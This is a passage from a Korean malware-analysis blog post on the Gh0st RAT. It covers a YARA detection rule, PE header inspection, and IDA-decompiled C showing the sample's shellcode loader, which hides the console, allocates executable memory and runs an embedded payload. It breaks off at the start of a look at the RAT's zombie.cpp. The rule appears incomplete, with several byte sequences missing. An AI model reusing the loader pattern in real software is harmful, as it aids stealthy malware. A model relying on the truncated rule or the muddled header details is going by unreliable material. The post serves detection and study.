class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line">rule win_ghost_rat_auto &#123;</span><br><span class="line"></span><br><span class="line">    meta:</span><br><span class="line">        author = &quot;Felix Bilstein - yara-signator at cocacoding dot com&quot;</span><br><span class="line">        date = &quot;2023-12-06&quot;</span><br><span class="line">        version = &quot;1&quot;</span><br><span class="line">        description = &quot;Detects win.ghost_rat.&quot;</span><br><span class="line">        info = &quot;autogenerated rule brought to you by yara-signator&quot;</span><br><span class="line">        tool = &quot;yara-signator v0.6.0&quot;</span><br><span class="line">        signator_config = &quot;callsandjumps;datarefs;binvalue&quot;</span><br><span class="line">        malpedia_reference = &quot;https://malpedia.caad.fkie.fraunhofer.de/details/win.ghost_rat&quot;</span><br><span class="line">        malpedia_rule_date = &quot;20231130&quot;</span><br><span class="line">        malpedia_hash = &quot;fc8a0e9f343f6d6ded9e7df1a64dac0cc68d7351&quot;</span><br><span class="line">        malpedia_version = &quot;20230808&quot;</span><br><span class="line">        malpedia_license = &quot;CC BY-SA 4.0&quot;</span><br><span class="line">        malpedia_sharing = &quot;TLP:WHITE&quot;</span><br><span class="line"></span><br><span class="line">    /* DISCLAIMER</span><br><span class="line">     * The strings used in this rule have been automatically selected from the</span><br><span class="line">     * disassembly of memory dumps and unpacked files, using YARA-Signator.</span><br><span class="line">     * The code and documentation is published here:</span><br><span class="line">     * https://github.com/fxb-cocacoding/yara-signator</span><br><span class="line">     * As Malpedia is used as data source, please note that for a given</span><br><span class="line">     * number of families, only single samples are documented.</span><br><span class="line">     * This likely impacts the degree of generalization these rules will offer.</span><br><span class="line">     * Take the described generation method also into consideration when you</span><br><span class="line">     * apply the rules in your use cases and assign them confidence levels.</span><br><span class="line">     */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    strings:</span><br><span class="line">        $sequence_0 = &#123; 6a01 56 ff15???????? 5e c20800 &#125;</span><br><span class="line">            // n = 5, score = 500</span><br><span class="line">            //   6a01                 | push                1</span><br><span class="line">            //   56                   | push                esi</span><br><span class="line">            //   ff15????????         |                     </span><br><span class="line">            //   5e                   | pop                 esi</span><br><span class="line">            //   c20800               | ret                 8</span><br><span class="line"></span><br><span class="line">        $sequence_1 = &#123; 8bd9 e8???????? 8b4d08 3bc8 &#125;</span><br><span class="line">            // n = 4, score = 500</span><br><span class="line">            //   8bd9                 | mov                 ebx, ecx</span><br><span class="line">            //   e8????????           |                     </span><br><span class="line">            //   8b4d08               | mov                 ecx, dword ptr [ebp + 8]</span><br><span class="line">            //   3bc8                 | cmp                 ecx, eax</span><br><span class="line"></span><br><span class="line">        $sequence_2 = &#123; 8b400c 85c0 7505 a1???????? 50 8bce &#125;</span><br><span class="line">            // n = 6, score = 500</span><br><span class="line">            //   8b400c               | mov                 eax, dword ptr [eax + 0xc]</span><br><span class="line">            //   7505                 | jne                 7</span><br><span class="line">            //   a1????????           |                     </span><br><span class="line">            //   50                   | push                eax</span><br><span class="line">            //   8bce                 | mov                 ecx, esi</span><br><span class="line"></span><br><span class="line">        $sequence_3 = &#123; 8be5 5d c20400 894df4 &#125;</span><br><span class="line">            // n = 4, score = 400</span><br><span class="line">            //   8be5                 | mov                 esp, ebp</span><br><span class="line">            //   5d                   | pop                 ebp</span><br><span class="line">            //   c20400               | ret                 4</span><br><span class="line">            //   894df4               | mov                 dword ptr [ebp - 0xc], ecx</span><br><span class="line"></span><br><span class="line">        $sequence_4 = &#123; 894df4 c745f800000000 df6df4 83ec08 dc0d???????? &#125;</span><br><span class="line">            // n = 5, score = 400</span><br><span class="line">            //   894df4               | mov                 dword ptr [ebp - 0xc], ecx</span><br><span class="line">            //   c745f800000000       | mov                 dword ptr [ebp - 8], 0</span><br><span class="line">            //   df6df4               | fild                qword ptr [ebp - 0xc]</span><br><span class="line">            //   83ec08               | sub                 esp, 8</span><br><span class="line">            //   dc0d????????         |                     </span><br><span class="line"></span><br><span class="line">        $sequence_5 = &#123; 6a6b 8bce e8???????? 5f &#125;</span><br><span class="line">            // n = 4, score = 400</span><br><span class="line">            //   6a6b                 | push                0x6b</span><br><span class="line">            //   8bce                 | mov                 ecx, esi</span><br><span class="line">            //   e8????????           |                     </span><br><span class="line">            //   5f                   | pop                 edi</span><br><span class="line"></span><br><span class="line">        $sequence_6 = &#123; e8???????? 8b8e549f0000 83c41c 89848e14030000 8b86549f0000 &#125;</span><br><span class="line">            // n = 5, score = 300</span><br><span class="line">            //   e8????????           |                     </span><br><span class="line">            //   8b8e549f0000         | mov                 ecx, dword ptr [esi + 0x9f54]</span><br><span class="line">            //   83c41c               | add                 esp, 0x1c</span><br><span class="line">            //   89848e14030000       | mov                 dword ptr [esi + ecx*4 + 0x314], eax</span><br><span class="line">            //   8b86549f0000         | mov                 eax, dword ptr [esi + 0x9f54]</span><br><span class="line"></span><br><span class="line">        $sequence_7 = &#123; 8d7b01 c60396 f3a5 53 8bcd &#125;</span><br><span class="line">            // n = 5, score = 300</span><br><span class="line">            //   8d7b01               | lea                 edi, [ebx + 1]</span><br><span class="line">            //   c60396               | mov                 byte ptr [ebx], 0x96</span><br><span class="line">            //   f3a5                 | rep movsd           dword ptr es:[edi], dword ptr [esi]</span><br><span class="line">            //   53                   | push                ebx</span><br><span class="line">            //   8bcd                 | mov                 ecx, ebp</span><br><span class="line"></span><br><span class="line">        $sequence_8 = &#123; 8db714030000 8b06 6aff 50 &#125;</span><br><span class="line">            // n = 4, score = 300</span><br><span class="line">            //   8db714030000         | lea                 esi, [edi + 0x314]</span><br><span class="line">            //   8b06                 | mov                 eax, dword ptr [esi]</span><br><span class="line">            //   6aff                 | push                -1</span><br><span class="line">            //   50                   | push                eax</span><br><span class="line"></span><br><span class="line">        $sequence_9 = &#123; 8b5614 8b02 8b400c 85c0 &#125;</span><br><span class="line">            // n = 4, score = 300</span><br><span class="line">            //   8b5614               | mov                 edx, dword ptr [esi + 0x14]</span><br><span class="line">            //   8b02                 | mov                 eax, dword ptr [edx]</span><br><span class="line">            //   8b400c               | mov                 eax, dword ptr [eax + 0xc]</span><br><span class="line">            //   85c0                 | test                eax, eax</span><br><span class="line"></span><br><span class="line">        $sequence_10 = &#123; e9???????? 8d45dc 50 681f000200 &#125;</span><br><span class="line">            // n = 4, score = 300</span><br><span class="line">            //   e9????????           |                     </span><br><span class="line">            //   8d45dc               | lea                 eax, [ebp - 0x24]</span><br><span class="line">            //   50                   | push                eax</span><br><span class="line">            //   681f000200           | push                0x2001f</span><br><span class="line"></span><br><span class="line">        $sequence_11 = &#123; 50 ff15???????? ffb6a8000000 ff15???????? ffb6ac000000 &#125;</span><br><span class="line">            // n = 5, score = 300</span><br><span class="line">            //   50                   | push                eax</span><br><span class="line">            //   ff15????????         |                     </span><br><span class="line">            //   ffb6a8000000         | push                dword ptr [esi + 0xa8]</span><br><span class="line">            //   ff15????????         |                     </span><br><span class="line">            //   ffb6ac000000         | push                dword ptr [esi + 0xac]</span><br><span class="line"></span><br><span class="line">        $sequence_12 = &#123; 8dbd85feffff f3ab 66ab aa &#125;</span><br><span class="line">            // n = 4, score = 300</span><br><span class="line">            //   8dbd85feffff         | lea                 edi, [ebp - 0x17b]</span><br><span class="line">            //   f3ab                 | rep stosd           dword ptr es:[edi], eax</span><br><span class="line">            //   66ab                 | stosw               word ptr es:[edi], ax</span><br><span class="line">            //   aa                   | stosb               byte ptr es:[edi], al</span><br><span class="line"></span><br><span class="line">        $sequence_13 = &#123; 6a00 6a00 c705????????20010000 e8???????? 8b35???????? &#125;</span><br><span class="line">            // n = 5, score = 300</span><br><span class="line">            //   6a00                 | push                0</span><br><span class="line">            //   6a00                 | push                0</span><br><span class="line">            //   c705????????20010000     |     </span><br><span class="line">            //   e8????????           |                     </span><br><span class="line">            //   8b35????????         |                     </span><br><span class="line"></span><br><span class="line">            // n = 7, score = 300</span><br><span class="line">            //   50                   | push                eax</span><br><span class="line">            //   57                   | push                edi</span><br><span class="line">            //   ff15????????         |                     </span><br><span class="line">            //   8bf8                 | mov                 edi, eax</span><br><span class="line">            //   83ffff               | cmp                 edi, -1</span><br><span class="line"></span><br><span class="line">        $sequence_15 = &#123; 83c40c 8d85b8feffff 50 8d85b4fdffff &#125;</span><br><span class="line">            // n = 4, score = 300</span><br><span class="line">            //   83c40c               | add                 esp, 0xc</span><br><span class="line">            //   8d85b8feffff         | lea                 eax, [ebp - 0x148]</span><br><span class="line">            //   50                   | push                eax</span><br><span class="line">            //   8d85b4fdffff         | lea                 eax, [ebp - 0x24c]</span><br><span class="line"></span><br><span class="line">        $sequence_16 = &#123; 8bce e8???????? 8b4df4 5f b001 5e &#125;</span><br><span class="line">            // n = 6, score = 300</span><br><span class="line">            //   8bce                 | mov                 ecx, esi</span><br><span class="line">            //   e8????????           |                     </span><br><span class="line">            //   8b4df4               | mov                 ecx, dword ptr [ebp - 0xc]</span><br><span class="line">            //   5f                   | pop                 edi</span><br><span class="line">            //   b001                 | mov                 al, 1</span><br><span class="line">            //   5e                   | pop                 esi</span><br><span class="line"></span><br><span class="line">        $sequence_17 = &#123; 8bf0 83c40c 46 750b 5f 5e 33c0 &#125;</span><br><span class="line">            // n = 7, score = 300</span><br><span class="line">            //   8bf0                 | mov                 esi, eax</span><br><span class="line">            //   83c40c               | add                 esp, 0xc</span><br><span class="line">            //   46                   | inc                 esi</span><br><span class="line">            //   750b                 | jne                 0xd</span><br><span class="line">            //   5f                   | pop                 edi</span><br><span class="line">            //   5e                   | pop                 esi</span><br><span class="line">            //   33c0                 | xor                 eax, eax</span><br><span class="line"></span><br><span class="line">        $sequence_18 = &#123; ff15???????? 6a01 ff7620 ff15???????? 8b4e04 e8???????? &#125;</span><br><span class="line">            // n = 6, score = 300</span><br><span class="line">            //   ff15????????         |                     </span><br><span class="line">            //   6a01                 | push                1</span><br><span class="line">            //   ff7620               | push                dword ptr [esi + 0x20]</span><br><span class="line">            //   ff15????????         |                     </span><br><span class="line">            //   8b4e04               | mov                 ecx, dword ptr [esi + 4]</span><br><span class="line">            //   e8????????           |                     </span><br><span class="line"></span><br><span class="line">        $sequence_19 = &#123; ff7510 ff75dc ff15???????? 85c0 7507 c745e401000000 834dfcff &#125;</span><br><span class="line">            // n = 7, score = 300</span><br><span class="line">            //   ff75dc               | push                dword ptr [ebp - 0x24]</span><br><span class="line">            //   ff15????????         |                     </span><br><span class="line">            //   85c0                 | test                eax, eax</span><br><span class="line">            //   7507                 | jne                 9</span><br><span class="line">            //   c745e401000000       | mov                 dword ptr [ebp - 0x1c], 1</span><br><span class="line">            //   834dfcff             | or                  dword ptr [ebp - 4], 0xffffffff</span><br><span class="line"></span><br><span class="line">        $sequence_20 = &#123; 56 53 e8???????? 83c408 84c0 750b &#125;</span><br><span class="line">            // n = 6, score = 300</span><br><span class="line">            //   56                   | push                esi</span><br><span class="line">            //   53                   | push                ebx</span><br><span class="line">            //   e8????????           |                     </span><br><span class="line">            //   83c408               | add                 esp, 8</span><br><span class="line">            //   84c0                 | test                al, al</span><br><span class="line">            //   750b                 | jne                 0xd</span><br><span class="line"></span><br><span class="line">        $sequence_21 = &#123; 68???????? 50 6802000080 e8???????? 83c41c 5f 5e &#125;</span><br><span class="line">            // n = 7, score = 300</span><br><span class="line">            //   68????????           |                     </span><br><span class="line">            //   50                   | push                eax</span><br><span class="line">            //   6802000080           | push                0x80000002</span><br><span class="line">            //   e8????????           |                     </span><br><span class="line">            //   83c41c               | add                 esp, 0x1c</span><br><span class="line">            //   5f                   | pop                 edi</span><br><span class="line">            //   5e                   | pop                 esi</span><br><span class="line"></span><br><span class="line">        $sequence_22 = &#123; 6a00 50 e8???????? 83c40c ff7508 6a40 ff15???????? &#125;</span><br><span class="line">            // n = 7, score = 300</span><br><span class="line">            //   6a00                 | push                0</span><br><span class="line">            //   50                   | push                eax</span><br><span class="line">            //   e8????????           |                     </span><br><span class="line">            //   83c40c               | add                 esp, 0xc</span><br><span class="line">            //   ff7508               | push                dword ptr [ebp + 8]</span><br><span class="line">            //   6a40                 | push                0x40</span><br><span class="line">            //   ff15????????         |                     </span><br><span class="line"></span><br><span class="line">        $sequence_23 = &#123; 8365fc00 ff7508 ff15???????? 40 50 ff15???????? 59 &#125;</span><br><span class="line">            // n = 7, score = 300</span><br><span class="line">            //   8365fc00             | and                 dword ptr [ebp - 4], 0</span><br><span class="line">            //   ff7508               | push                dword ptr [ebp + 8]</span><br><span class="line">            //   40                   | inc                 eax</span><br><span class="line">            //   50                   | push                eax</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            //   8b4d08               | mov                 ecx, dword ptr [ebp + 8]</span><br><span class="line">            //   8d540102             | lea                 edx, [ecx + eax + 2]</span><br><span class="line"></span><br><span class="line">        $sequence_30 = &#123; 8b55dc 8b7a18 8b7220 0375f8 33c9 &#125;</span><br><span class="line">            // n = 5, score = 100</span><br><span class="line">            //   8b55dc               | mov                 edx, dword ptr [ebp - 0x24]</span><br><span class="line">            //   8b7a18               | mov                 edi, dword ptr [edx + 0x18]</span><br><span class="line">            //   8b7220               | mov                 esi, dword ptr [edx + 0x20]</span><br><span class="line">            //   0375f8               | add                 esi, dword ptr [ebp - 8]</span><br><span class="line">            //   33c9                 | xor                 ecx, ecx</span><br><span class="line"></span><br><span class="line">        $sequence_31 = &#123; 6bc928 8b9538ffffff 8b8560ffffff 03440a0c 8985fcfeffff &#125;</span><br><span class="line">            // n = 5, score = 100</span><br><span class="line">            //   6bc928               | imul                ecx, ecx, 0x28</span><br><span class="line">            //   8b9538ffffff         | mov                 edx, dword ptr [ebp - 0xc8]</span><br><span class="line">            //   8b8560ffffff         | mov                 eax, dword ptr [ebp - 0xa0]</span><br><span class="line">            //   03440a0c             | add                 eax, dword ptr [edx + ecx + 0xc]</span><br><span class="line">            //   8985fcfeffff         | mov                 dword ptr [ebp - 0x104], eax</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        7 of them and filesize &lt; 357376</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>우선 코드에서도 나눠져 있듯 meta, string, conditions 세 파트를 살펴보자. 이는 악성코드 해석이 아닌 RAT 탐지에 사용되는 규칙에 대한 해설이므로, 위의 세 파트만 간결하게 살펴본 뒤 넘어가도록 하겠다. </p>
+<p><strong>(1) meta</strong></p>
+<ul>
+<li>malpedia_hash: 참조된 악성코드 파일의 해시 값. (“fc8a0e9f343f6d6ded9e7df1a64dac0cc68d7351”)</li>
+<li>malpedia_version: 참조된 악성코드 정보의 버전 (2023-08-08)</li>
+<li>malpedia_charing: 참조된 악성코드 정보의 공유 수준 (TLP)</li>
+</ul>
+<p><strong>(2) strings</strong></p>
+<p>이 섹션은 규칙이 탐지하려는 특정 바이트 시퀀스를 정의한다. 각 문자열은 바이너리 코드의 특정 패턴을 나타낸다.</p>
+<p>각 $sequence_0, $sequence_1, …, $sequence_31는 고유한 바이너리 패턴을 정의한다. 주석으로 각 시퀀스의 어셈블리 코드를 설명한다.</p>
+<p>String 탐지는 value 타이틀에 속해있는 string들을 탐지하는 방법이다. 탐지 문자열 대소문자 구별을 하고 싶다면 뒤에 nocase를 붙여 사용한다.</p>
+<p><strong>(3) condition</strong></p>
+<p>조건 섹션은 규칙이 적용될 파일을 정의하고, 해당 조건에 대한 결과값이 참인지 거짓인지 판별한다. </p>
+<ul>
+<li><p>7 of them : 문자열 섹션에 정의된 31개의 시퀀스 중 7개 이상이 매칭될 때 규칙이 발동된다.</p>
+</li>
+<li><p>Filesize &lt; 357376 : 파일 크기가 해당 바이트보다 작을 때 규칙이 발동된다.</p>
+</li>
+</ul>
+<p>위의 규칙들은 Gh0st RAT 악성코드를 탐지하기 위한 asm 코드 패턴을 정의하며, 이를 통해 해당 악성코드가 포함된 파일을 식별할 수 있다.</p>
+<p>규칙 설립을 완료했으니 본격적으로 파일을 분석해 보자. </p>
+<p>먼저 Gh0st RAT 분석을 위해 샘플 파일을 받아주었다. 다운로드 링크는 다음과 같다 : <span class="exturl" data-url="aHR0cHM6Ly9iYXphYXIuYWJ1c2UuY2gvYnJvd3NlLnBocD9zZWFyY2g9dGFnOkdoMHN0">https://bazaar.abuse.ch/browse.php?search=tag%3AGh0st</span></p>
+<p><img src="/images/313203_251004_image3.png" alt="그림 87. Gh0st RAT 샘플 파일의 모습(1)"></p>
+<center><span style="font-size: 90%;">그림 87. [Gh0st RAT 샘플 파일의 모습(1)] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p><img src="/images/313203_251004_image4.png" alt="그림 88. Gh0st RAT 샘플 파일의 모습(2)"></p>
+<center><span style="font-size: 90%;">그림 88. [Gh0st RAT 샘플 파일의 모습(2)] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>아래의 다운로드 버튼을 누르면 다운이 시작된다.</p>
+<h2 id="6-5-PEView-분석"><a href="#6-5-PEView-분석" class="headerlink" title="6-5. PEView 분석"></a>6-5. PEView 분석</h2><p><img src="/images/313203_251004_image5.png" alt="그림 89. PEView 프로그램으로 악성코드 파일을 연 모습"></p>
+<center><span style="font-size: 90%;">그림 89. [PEView 프로그램으로 악성코드 파일을 연 모습] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+
+<p>화면에 보이는<br>‘54dc7635c51ecd94cfe8e45cbac2e52191867b9ff0465d778ee5a200bb832c22’는 다운로드 받은 파일의 해시값이다. </p>
+<p>PE 파일은 파일의 구조, 내용, 메타데이터 등을 담은 PE 헤더와 실제의 코드, 데이터, 리소스 등을 담은 PE 바디로 구성되어 있으며, 사진의 IMAGE_SECTION HEADER까지가 PE 헤더이고, SECTION .text 부터가 PE 바디이다. </p>
+<p>헤더와 바디 모두, .tls 이후로는 값이 &#x2F;number 형식으로 통일되어 있었다. </p>
+<p><img src="/images/313203_251004_image6.png" alt="그림 90. IMAGE_SECTION_HEADER"></p>
+<center><span style="font-size: 90%;">그림 90. [IMAGE_SECTION_HEADER] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>.tls까지는 value가 tls라고 명시되어 있지만, 그 이후로는 value가 &#x2F;number로 표기되어 있는 것을 확인할 수 있다. </p>
+<h3 id="a-IMAGE-DOS-HEADER-DOS-Header"><a href="#a-IMAGE-DOS-HEADER-DOS-Header" class="headerlink" title="a. IMAGE_DOS_HEADER (DOS Header)"></a>a. IMAGE_DOS_HEADER (DOS Header)</h3><p><img src="/images/313203_251004_image7.png" alt="그림 91. IMAGE_DOS_HEADER"></p>
+<center><span style="font-size: 90%;">그림 91. [IMAGE_DOS_HEADER] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>PE 파일을 나타내는 시그니처(e_magic)의 값이 5A4D로 나타나있다.</p>
+<p>그리고 NT Header가 시작되는 위치의 offset을 나타내는 Offset the New EXE Header(e_lvanew)의 값이 0x3C로 세팅되어 있다.</p>
+<h3 id="b-MS-DOS-Stub-Program-DOS-Stub"><a href="#b-MS-DOS-Stub-Program-DOS-Stub" class="headerlink" title="b. MS-DOS Stub Program (DOS Stub)"></a>b. MS-DOS Stub Program (DOS Stub)</h3><p><img src="/images/313203_251004_image8.png" alt="그림 92. MS-DOS Stub Program"></p>
+<center><span style="font-size: 90%;">그림 92. [MS-DOS Stub Program] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>이 프로그램은 DOS mode에서는 실행될 수 없다. 해당 문자열 이후 DOS 프로그램이 아닐 경우 실행될 수 있다는 문자열이 추가되어 있는 PE 파일들도 있는데, 해당 파일의 경우 딱 저 문자열만 적혀 있다. </p>
+<h3 id="c-IMAGE-NT-HEADERS-NT-Header"><a href="#c-IMAGE-NT-HEADERS-NT-Header" class="headerlink" title="c. IMAGE_NT_HEADERS (NT Header)"></a>c. IMAGE_NT_HEADERS (NT Header)</h3><p><strong>(1)signature</strong></p>
+<p><img src="/images/313203_251004_image9.png" alt="그림 93. Signature"></p>
+<center><span style="font-size: 90%;">그림 93. [Signature] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>Signature 값 50450000. (변경 불가)</p>
+<p><strong>(2)IMAGE_FILE_HEADER</strong></p>
+<p><img src="/images/313203_251004_image10.png" alt="그림 94. IMAGE_FILE_HEADER"></p>
+<center><span style="font-size: 90%;">그림 94. [IMAGE_FILE_HEADER] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>헤더의 필드들은 다음과 같다.</p>
+<ul>
+<li>Machine: 컴퓨터 아키텍처 유형을 뜻한다. (0x14C &gt; x86 system)</li>
+<li>Number of Sections: 0xF로 세팅 되어있으며, 섹션의 개수는 15개이다. 아까 위에서 바로 열었을 때 확인한 섹션의 개수와 동일하다.</li>
+<li>Time Date Stamp: 이미지를 만든 날짜와 시간을 나타낸다. (UTC)</li>
+<li>Size of Optional Header: Optional Header의 크기가 0xE0(224바이트)이다.<br>-&gt; 그렇다면 OPTIONAL HEADER는 아래 그림의 0B 01 02 17 00 1A 00 00 부터 시작된다.</li>
+</ul>
+<p><img src="/images/313203_251004_image11.png" alt="그림 95. OPTIONAL HEADER"></p>
+<center><span style="font-size: 90%;">그림 95. [OPTIONAL HEADER] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+
+<ul>
+<li>Characteristics : 파일의 속성을 나타내는 값으로, bit OR 연산을 통해 최종적으로 0x0107 값으로 설정됨.</li>
+</ul>
+<p><strong>(3)IMAGE_OPTIONAL_HEADER</strong></p>
+<p><img src="/images/313203_251004_image12.png" alt="그림 96. IMAGE_OPTIONAL_HEADER"></p>
+<center><span style="font-size: 90%;">그림 96. [IMAGE_OPTIONAL_HEADER] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<ul>
+<li>Magic: 32비트인 경우 0x10B를 가지며, IMAGE_OPTIONAL_HEADER32를 뜻한다.</li>
+<li>Address of Entry Point: 메모리 매핑된 후의 코드 시작 주소가 0x1500으로 되어 있다는 뜻이다. 이후 ImageBase에 이 값을 더해 코드 시작 지점을 설정한다. </li>
+<li>Image Base: PE 파일이 로딩되는 시작 주소이며, 일반적으로 exe 파일은 0x400000이다.</li>
+<li>Section &#x2F; File Alignment: 메모리에서 섹션의 최소 단위는 0x1000이며 파일에서 섹션의 최소 단위는 0x200이다.</li>
+<li>Size of Image &#x2F; Headers: 메모리 로딩될 때 가상 메모리에서 PE Image가 차지하는 크기는 0x1000이며 파일에서 섹션의 최소 단위는 0x200이다. 여기서의 size of image는 0x1D000이며 size of headers는 0x400이라고 한다. </li>
+<li>Subsystem: 동작 환경을 정의하는 필드로, 0x0003으로 설정되어 있으면 CUI임을 가리킨다. </li>
+<li>Number of Data Directories: 총 0x10(16개)의 디렉토리를 갖는다.</li>
+</ul>
+<p><img src="/images/313203_251004_image13.png" alt="그림 97. 디렉토리의 모습"></p>
+<center><span style="font-size: 90%;">그림 97. [디렉토리의 모습] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>확인 결과 실제로 16개의 디렉터리가 존재한다.</p>
+<h3 id="d-IMAGE-SECTION-HEADER"><a href="#d-IMAGE-SECTION-HEADER" class="headerlink" title="d. IMAGE_SECTION_HEADER"></a>d. IMAGE_SECTION_HEADER</h3><p><img src="/images/313203_251004_image14.png" alt="그림 98. 각 IMAGE_SECTION_HEADER의 모습"></p>
+<center><span style="font-size: 90%;">그림 98. [각 IMAGE_SECTION_HEADER의 모습] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>.text 부분의 필드만 해석하겠다. </p>
+<ul>
+<li>Virtual Address(RVA): 0x1000</li>
+<li>Size of Raw Data: 0x1A00</li>
+<li>Pointer to Raw Data: 0x400</li>
+<li>Characteristics: 섹션의 속성, Bit OR 연산의 결과. 0x60500020</li>
+</ul>
+<p>참고로 다른 것도 살펴 본 결과, .data에는 read와 write 속성이 다 있었지만 .rdata에는 read 속성밖에 없었다.</p>
+<p><strong>(1)SECTION .idata</strong></p>
+<p>.idata에는 Import 정보가 들어있다. </p>
+<p><img src="/images/313203_251004_image15.png" alt="그림 99. SECTION .idata"></p>
+<center><span style="font-size: 90%;">그림 99. [SECTION .idata] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>KERNEL32.dll, msvcrt.dll, USER32.dll을 import한다. </p>
+<p><img src="/images/313203_251004_image16.png" alt="그림 100. Import name table의 모습"></p>
+<center><span style="font-size: 90%;">그림 100. [Import name table의 모습] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>import name table에는 해당 dll이 어떤 파일 위치에서 무엇을 호출하는지가 적혀 있다. </p>
+<h2 id="6-6-IDA-분석"><a href="#6-6-IDA-분석" class="headerlink" title="6-6. IDA 분석"></a>6-6. IDA 분석</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  LPVOID lpAddress; <span class="comment">// [esp+14h] [ebp-14h] // 메모리 주소 저장 포인터</span></span><br><span class="line">  HWND hWnd; <span class="comment">// [esp+1Ch] [ebp-Ch] // 콘솔 윈도우 핸들 저장 변수</span></span><br><span class="line"></span><br><span class="line">  __main(); <span class="comment">// 초기화 및 콘솔 윈도우 숨기기</span></span><br><span class="line">  hWnd = GetConsoleWindow(); <span class="comment">// 현재 콘솔 윈도우 핸들 반환</span></span><br><span class="line">  ShowWindow(hWnd, <span class="number">0</span>); <span class="comment">// 콘솔 윈도우 숨기기</span></span><br><span class="line">  lpAddress = VirtualAlloc(<span class="number">0</span>, <span class="number">0x97C</span>u, <span class="number">0x3000</span>u, <span class="number">0x40</span>u); <span class="comment">// 0x97C 바이트 메모리 할당</span></span><br><span class="line">  <span class="keyword">if</span> ( lpAddress ) <span class="comment">// 메모리 할당 성공 시</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(lpAddress, binary, <span class="number">0x97C</span>u); <span class="comment">// 할당된 메모리에 바이너리 코드를 함수 포인터로 변환하여 실행</span></span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))lpAddress)(); <span class="comment">// 할당된 메모리의 바이너리 코드를 함수 포인터로 변환하여 실행</span></span><br><span class="line">    VirtualFree(lpAddress, <span class="number">0</span>, <span class="number">0x8000</span>u); <span class="comment">// 메모리 해제</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  Else <span class="comment">// 메모리 할당 실패 시</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;Buffer); <span class="comment">// Buffer의 내용 출력</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>IDA로 main 부분의 asm 코드를 C로 변환했다. 코드 해설은 주석에 적혀 있으며, 콘솔 윈도우를 숨기는 이유는 프로그램 작동 사실을 victim(사용자)로부터 숨기기 위함으로 보인다. </p>
+<p><img src="/images/313203_251004_image17.png" alt="그림 101. IDA의 구성 모습"></p>
+<center><span style="font-size: 90%;">그림 101. [IDA의 구성 모습] </span><br><span style="font-size: 70%;"></span></center>  
+<br>
+
+<p>PEView에서 본 Import name table의 필드들이 포함된 것을 확인할 수 있다. </p>
+<h2 id="6-7-zombie-cpp-분석"><a href="#6-7-zombie-cpp-분석" class="headerlink" title="6-7. zombie.cpp 분석"></a>6-7. zombie.cpp 분석</h2><p>해당 코드는 Gh0st RAT과 관련하여 원격 제어와 명령 실행을 목적으로 하는 코드이다.</p>
+<h3 id="a-기본-설정-및-포함-파일"><a href="#a-기본-설정-및-포함-파일" class="headerlink" title="a. 기본 설정 및 포함 파일"></a>a. 기본 설정 및 포함 파일</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> GHOSTVER <span class="string">&quot;1.0.3b&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_BUFF 19056</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TMPLOG <span class="string">&quot;svchost.log&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_TARGET HKEY_LOCAL_MACHINE </span></span><br><span class="line"><span 